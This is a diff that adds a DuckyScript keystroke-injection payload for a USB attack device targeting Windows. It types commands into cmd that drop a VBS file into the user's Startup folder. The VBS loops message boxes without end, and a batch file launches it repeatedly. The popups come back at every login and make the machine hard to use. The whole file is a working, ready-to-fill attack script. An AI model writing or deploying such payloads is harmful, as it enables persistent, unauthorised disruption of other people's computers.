@@ -1,0 +1,43 @@
+REM
+DELAY 600
+GUI R
+DELAY 300
+STRING "cmd"
+DELAY 100
+ENTER
+DELAY 500
+STRING cd %appdata%
+DELAY 200
+ENTER
+STRING cd Microsoft\Windows\Start Menu\Programs\Startup
+DELAY 200
+ENTER
+STRING copy con systemMenu.vbs
+DELAY 200
+ENTER
+STRING do
+DELAY 100
+ENTER
+STRING msgbox "***Your Message Here***"
+DELAY 100
+ENTER
+STRING loop
+CTRL z
+DELAY 100
+ENTER
+DELAY 100
+STRING copy con systemfiles.bat
+DELAY 100
+ENTER
+DELAY 100
+STRING @echo off
+DELAY 100
+ENTER
+DELAY 50
+STRING for /l %%x in (1, 1, ***number of times to show the popup***) do START systemMenu.vbs
+DELAY 100
+CTRL z
+DELAY 100
+ENTER
+DELAY 200
+ALT F4
